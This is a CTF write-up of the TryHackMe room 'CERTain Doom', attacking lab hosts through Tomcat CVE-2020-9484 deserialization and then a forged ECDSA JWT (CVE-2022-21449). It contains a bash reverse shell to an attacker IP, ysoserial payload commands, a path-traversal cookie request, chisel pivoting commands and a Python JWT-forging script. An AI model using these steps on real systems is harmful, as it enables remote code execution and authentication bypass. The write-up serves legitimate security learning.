---
title: CERTain Doom
date: 2024-09-16 21:18:00 +0200
categories:
  - TryHackMe
tags:
  - Web
  - RCE
  - Deserialization
  - Java
  - CVE-2020-9484
  - CVE-2022-21449
  - JWT
  - Pivoting
  - Quarkus
description: Bob has since joined the CERT team and developed a nifty new site. Is there more than meets the eye?
render_with_liquid: false
media_subpath: /assets/img/thm_images/tryhackme_CERTain_Doom/
image:
  path: room.png
---
## Room
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** CERTain Doom v3
- **Name:** [CERTain Doom](https://tryhackme.com/r/room/certaindoom)
- **Description:** Bob has since joined the CERT team and developed a nifty new site. Is there more than meets the eye?

### Flags

1. What is the web flag?
2. What is the user's flag?
3. What is the super secret flag?

### Author

- **Name:** [m3gakr4nus](https://tryhackme.com/p/m3gakr4nus)
- **Duration:** 2024-09-13 - 2024-09-16

## Disclaimer

Before we start with the writeup, I would like to let the reader know that this room was not completed solely by me. I received a lot of help from ([hydragyrum](https://tryhackme.com/p/hydragyrum)) the creator of the room , [jaxafed](https://tryhackme.com/p/jaxafed) the legend himself and [sarperavci](https://tryhackme.com/p/sarperavci) a good friend.

I would like to thank the people mentioned above for helping me get through this CTF.
## Initial Recon

I started by scanning the target with `nmap`
```text
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:69:84:5c:69:01:42:2d:da:01:3e:13:a6:db:2f:c3 (RSA)
|   256 cc:55:d5:72:1d:be:03:85:d5:7e:3e:1a:d6:72:2c:2c (ECDSA)
|_  256 08:34:3b:e0:5d:d1:37:d4:68:28:6b:cf:e2:f1:53:ed (ED25519)
80/tcp   open   http       hastatic-1.0.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: hastatic-1.0.0
8080/tcp open   http-proxy Apache Tomcat 9?
|_http-server-header: Apache Tomcat 9?
|_http-title: HTTP Status 404 \xE2\x80\x93 Not Found
```

It seems like there are two web servers running. Let's start by `port 80.`
After spending 5 seconds on the website, we are redirected to YouTube.

![](<Pasted image 20240916222122.png>){: w="700" h="300" .center}

ha ha, very funny. >:\\

Looking at the source code, we learn the target's domain name:

![](<Pasted image 20240916222236.png>){: w="500" h="300" .center}

Let's add it to our `/etc/hosts` file.

`10.10.150.44 admin.certain-doom.thm certain-doom.thm`

Moving on to `port 8080`, we get a `404 not found`. The same error that I got when I was looking for my will to live during this CTF... XD

![](<Pasted image 20240916222857.png>){: w="500" h="300" .center}

The nmap scan and `wapalyzer` both indicate that this is `Apache tomcat` possibly version 9.

After fuzzing for directories, we find one called `reports`.
Scrolling down we are faced with a file upload functionality.

![](<Pasted image 20240916223049.png>){: w="700" h="300" .center}

After testing it, there are no limit to any file type that you upload, the application even tells you where the uploaded file is stored at:

![](<Pasted image 20240916223303.png>){: w="700" h="300" .center}

Since this file is stored locally, outside of the web server's reach, and with no other way to have the file executed, it got me thinking.

Looking at the cookie we have a `JSESSIONID`. Looking for vulnerabilities I came across `CVE-2020-9484`

## Flag 1
### CVE-2020-9484

> [nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2020-9484) - CVE-2020-9484
> 
> When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server...
{: .prompt-info}

While looking for ways to exploit this vulnerability, I learned that a tool called `ysoserial` must be used.

> [GitHub](https://github.com/frohoff/ysoserial) - ysoserial
> 
> A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
{: .prompt-tip}

### Initial Access
Let's write a simple reverse shell payload and upload it.

```bash
#!/bin/bash
bash -I >& /dev/tcp/10.11.75.248/53 0>&1
```

After this, we can use `ysoserial` to generate a malicious payload that gets unsafely deserialized and executes our payload.

```console
m3ga@kali:~$ java -jar ysoserial-all.jar CommonsCollections2 'bash /usr/local/tomcat/temp/uploads/payload.sh' > chmodPayload.session
```

After trying to follow through with this [PoC](https://romanenco.medium.com/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4), I kept getting the following error:
```text
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x6e0be858) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x6e0be858
	at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
	at ysoserial.payloads.CommonsCollections2.getObject(CommonsCollections2.java:33)
	at ysoserial.payloads.CommonsCollections2.getObject(CommonsCollections2.java:27)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
```

After some googling, I realized that I have to use `openjdk-11`. I was using `openjdk-23` instead which is installed on `Kali Linux` by default.

> After installing `openjdk-11`, I wasn't getting any errors. But the payloads weren't being deserialized and so I wasn't getting a reverse shell. That's when `@sarperacvi` told me that he got it working by building `ysoserial` and using it that way.
> 
> I built it from source as well and it worked. I don't understand what the problem was exactly but it took a long time to figure it out.
{: .prompt-warning}

After building `ysoserial`, let's try creating the payload again:
```console
m3ga@kali:~$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 'bash /usr/local/tomcat/temp/uploads/payload.sh' > execute.session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Let's upload it and make a request to the server with our `JSESSIONID` pointing to where the file is stored at.

```
curl http://certain-doom.thm:8080/reports/upload -H 'Cookie:JSESSIONID=../../../../../../../../../../usr/local/tomcat/temp/uploads/execute' -F 'image=@execute.session'
```

> Using 10 `../` worked for me. Anything lower wasn't being executed.
{: .prompt-tip}

```console
m3ga@kali:~$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.11.75.248] from (UNKNOWN) [10.10.150.44] 49702
id
uid=0(root) gid=0(root) groups=0(root)

ls -la
total 132
drwxr-xr-x. 1 root root    69 Aug  9  2023 .
drwxr-xr-x. 1 root root    20 Apr 29  2020 ..
-rw-r--r--. 1 root root    38 Aug  8  2023 .flag
...

cat .flag
THM{[REDACTED]}
...
```

Since we got `root` as our initial foothold, I was suspicious that this was a container and seeing the `.dockerenv` file in the root directory confirmed it for me.

## Flag 2

### Recon

After some enumeration, I found two entries inside the `/etc/hosts` file.
```console
root@2c5b93ea49de:~$ cat /etc/hosts
...
172.20.0.3	2c5b93ea49de
172.18.0.3	2c5b93ea49de
```

After uploading `nmap` on the target and scanning the subnets, the hosts `172.20.0.1-4` and `172.18.0.1-3` are up.

After going through and scanning for open ports, the `172.20.0.2:80` and `172.20.0.3:8080` came into attention.

### Pivoting
Let's get `chisel` on the target and forward the ports so we can access them from our local machine.

First, we run `chisel` in **server mode** on our own machine:
```console
m3ga@kali:~$ ./chisel server --reverse 4545 # Can be any unused port you want
```

Now let's port-forward the two hosts.
```console
root@2c5b93ea49de:~$ ./chisel client <attacker-ip>:4545 R:81:172.20.0.2:80 &
```
The `R:81` means that we will be able to access `172.20.0.2:80` from our local machine by navigating to `127.0.0.1:81`.

Same thing for the other one but with different ports:
```console
root@2c5b93ea49de:~$ ./chisel client <attacker-ip>:4545 R:82:172.20.0.3:8080 &
```

> You can use SOCKS proxies to tunnel your connection through the host so you don't have to mess with ports and make yourself confused. I learned this from `@sarperavci` and `@jaxafed`'s writeup
{: .prompt-tip}

Navigating to `172.20.0.2:80`, we see a library which you can look for documents or upload your own.

![](<Pasted image 20240916233110.png>){: w="700" h="300" .center}

The `172.20.0.2:8080` host just returns a `404`.  But after doing some enumeration, we find the route `/documents` on it.

### Code Review
Now, this is where I was stuck. I had to ask for help. Who is better to ask help from than the guy who created this room?

So, after some discussions with `@hydragyrum`, I got the tip to look in those JavaScript files.
![](<Pasted image 20240916233528.png>){: w="700" h="300" .center}

I found out that this host is communicating with `library-check:8080`. There were some mentions of a `/login`, `/documentation`, `/documentation/download` but I was just getting `404s` and not really working for me.

So after going though all of these files three times, looking for the calls that would be made to the `/login`, I realized that not all `.js` files are listed here.

Looking at the `app.esm.js?v=...`, we learn about all of the API's endpoints. One of which is `app-login`.

![](<Pasted image 20240916233932.png>){: w="200" h="200" .center}

The `p-340f8600` caught my eye, since the other `.js` files were named similarly and that they were stored in `/build`, I just tried my luck and navigated to `/build/p-340f8600.js`. It did give me a `404` but since I noticed some of the files have `.entry` in them, I tried it and it worked!

```js
import {
    r as e,
    h as r,
    g as t
} from "./p-de878568.js";
let o = class {
    constructor(r) {
        e(this, r)
    }
    handleSubmit(e) {
        e.preventDefault();
        const r = new URLSearchParams(new FormData(e.currentTarget));
        fetch("http://library-back:8080/j_security_check", {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: r
        }).then((e => {
            if (console.log(e), !e.ok) throw Error("invalid login");
            this.history.push("/")
        })).catch((e => console.log(e)))
    }
    render() {
        return r("form", {
            id: "loginForm",
            onSubmit: e => this.handleSubmit(e)
        }, r("label", null, "Username:", r("input", {
            type: "text",
            name: "j_username",
            id: "username",
            required: !0
        })), r("label", null, "Password:", r("input", {
            type: "password",
            name: "j_password",
            id: "password",
            required: !0
        })), r("button", {
            type: "submit"
        }, "Submit"))
    }
    get host() {
        return t(this)
    }
};
```

This part of the code seems to be rendering some fields on the page such as `username` and `password` lables and input-fields.

```javascript
render() {
        return r("form", {
            id: "loginForm",
            onSubmit: e => this.handleSubmit(e)
        }, r("label", null, "Username:", r("input", {
            type: "text",
            name: "j_username",
            id: "username",
            required: !0
        })), r("label", null, "Password:", r("input", {
            type: "password",
            name: "j_password",
            id: "password",
            required: !0
        })), r("button", {
            type: "submit"
        }, "Submit"))
    }
```

This part is reading the values inside the input-fields and sending them to `http://library-back:8080/j_security_check`

```javascript
handleSubmit(e) {
        e.preventDefault();
        const r = new URLSearchParams(new FormData(e.currentTarget));
        fetch("http://library-back:8080/j_security_check", {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: r
        }).then((e => {
            if (console.log(e), !e.ok) throw Error("invalid login");
            this.history.push("/")
        })).catch((e => console.log(e)))
    }
```

### Access as Bob
Since the ports on `172.20.0.2` and `library-back` are the same, I just took an educated guess and made a `POST` request to `j_security_check` with `test:test` and I got a response.

```text
HTTP/1.1 401 Unauthorized
content-length: 0
```

The description of this room kind of points out the credentials we need.
> **Bob** has since joined the CERT team and developed a nifty new site...

So I tried `bob:bob` as the creds and I got a session cookie back!

![](<Pasted image 20240917185347.png>){: w="700" h="300" .center}

> I would later find out that the password doesn't really matter as long as it starts with `bob`. The backend code is essentially checking for `bob*` in the password for some reason.
{: .prompt-info}

Navigating to `172.20.0.3:8080/documents`, we see a document called `hello.txt` listed. It doesn't contain anything useful.

![](<Pasted image 20240917185655.png>){: w="500" h="300" .center}

We also see a key called `hidden` with a value of `false`. From my previous enumerations on the `172.20.0.2` was sending `GET` requests such as `/documents?name=..&author=...`

So I just used `/documents?hidden=true`, and I got two documents back:

![](<Pasted image 20240917185939.png>){: w="500" h="300" .center}

I also knew from my previous enumeration, that it is possible to download these documents by using `/documents/download/<filename>`.

The second flag can be found inside `chat.log`:
![](<Pasted image 20240917190252.png>){: w="700" h="300" .center}

## Flag 3
### Enumeration
The conversation in the `chat.log` file was between `bob` and `hydra`. By using `/documents?author=hydra`,  we get a file back called `flagz.docx`

![](<Pasted image 20240917192821.png>){: w="700" h="300" .center}

Unfortunately, this didn't contain the final flag but it had some words of wisdom which I encourage other people to read what's inside the document.

At this point, I was stuck. I spent hours trying to find a possible way inside the machine but as `@hydragyrum` mentioned in Discord, the room wasn't a typical boot-to-root challenge. 

Asking for some help from `@jaxafed`, he mentioned that if you fuzz the `id` of the requests, you will find a file from `hydra` which is hidden. 

Let's fuzz this and see
`/documents/64d35510774649ab3562697e` --> `/documents/64d35510774649ab3562[FUZZ]`

![](<Pasted image 20240917200141.png>){: w="400" h="300" .center}

And after sometime, sure enough, there is a file called `specs.pdf`

![](<Pasted image 20240917201038.png>){: w="700" h="300" .center}

But trying to download this file, we simply get a `404`. 

`@jaxafed` added that, we need to authenticate as `hydra` and download the file. He went on to explain the conversation in `chat.log` that there was a mention of `JWT` and a major vulnerability inside an algorithm that `Bob` was using which could be `ECDSA` and that leading to `CVE-2022-21449: Psychic Signatures`.

The only problem here was that, we didn't know what `claims` to use inside the forged JWT.

Again, after spending hours, I gave up and asked `@hydragyrum` for help. He mentioned the hint in the room `supersonic subatomic`. 

Googling the hint, we learn about `Quarkus`. Further looking inside `Quarkus`'s [documentation](https://quarkus.io/guides/security-jwt) We learn about some `claims` which could potentially be used such as : `username`, `name`, `birthdate`, `upn`.

### CVE-2022-21449

> [nist.gov](https://nvd.nist.gov/vuln/detail/cve-2022-21449) - CVE-2022-21449
> 
> Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 17.0.2 and 18; Oracle GraalVM Enterprise Edition: 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data.
{: .prompt-info}

Here is some reading material on this `CVE` and how it can be exploited:
- [neilmadden.blog](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/)
- [securecodewarrior.com](https://www.securecodewarrior.com/article/psychic-signatures)

Using the code below (thank you ChatGPT), we can generate a forged JWT. Some other common `claims` have been added as well.
```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

header = {
    "alg": "ES256",  # ECDSA using P-256 and SHA-256
    "typ": "JWT"
}

# Modify and test different payloads to see what the application accepts
payload ={
  "sub": "hydra",
  "admin": True,
  "name": "hydra",
  "username": "hydra",
  "user" : "hydra",
  "id": 0
}

# Encode header and payload
header_b64 = base64url_encode(json.dumps(header).encode())
payload_b64 = base64url_encode(json.dumps(payload).encode())

# r=s=0 (DER-encoded)
signature_DER = "MAYCAQACAQA"
    
# Put everything together
jwt_forged = f"{header_b64}.{payload_b64}.{signature_DER}"

print(f"Testing with payload: {payload}")
print(f"Forged JWT: {jwt_forged}\n")
```

But it wasn't working. I was stuck yet again.

![](<Pasted image 20240917212029.png>){: w="700" h="300" .center}

So asking for help from `@jaxafed`, he told me that I need the claim `"groups": ["user"]`. 

Adding this to my `payload` variable, and generating a new forged JWT, we can read the contents of `specs.pdf`
![](<Pasted image 20240917213103.png>){: w="700" h="300" .center}

Let's right click on the `reponse` to open it the browser so we can download the file.

`Request in Browser > In original session > [copy link] > [open in browser]`

The final page contains a flag `THM{This_is_not_the_real_flag_try_again}`. Another troll from `@hydragyrum` :0

If you have the document opened in a browser, you can simply `inspect` the code as you would inspect `html`.

![](<Pasted image 20240917214722.png>){: w="700" h="300" .center}

Scrolling through the document pages, we see these **weird blank pages**. Trying to highlight these pages by pressing the left-click and dragging over the page reveals something is hidden on **page 8**

## Outro
I would like to thank the creator of this room ([hydragyrum](https://tryhackme.com/p/hydragyrum))

This room was initially released as `medium` and it got changed after a day or so to `hard`. Which I find was fair. The amount of time, enumeration, trial and errors and psychological efforts to stay sane required for this room shouldn't really be considered 'medium'. 

The last part on finding the claims was a little confusing to me as well. Normally you have a JWT which you can decode and see the claims unless they are encrypted. I'm not sure how `@jaxafed` found out about the specific claims, possibly through many trials and errors, but it was almost impossible for me.

Again, I couldn't have completed this room without the help of `@jaxafed`, `@hydragyrum` and `@sarperacvi`.

I learned many new things from this room, so it wasn't a bad experience after all.

\- m3gakr4nus
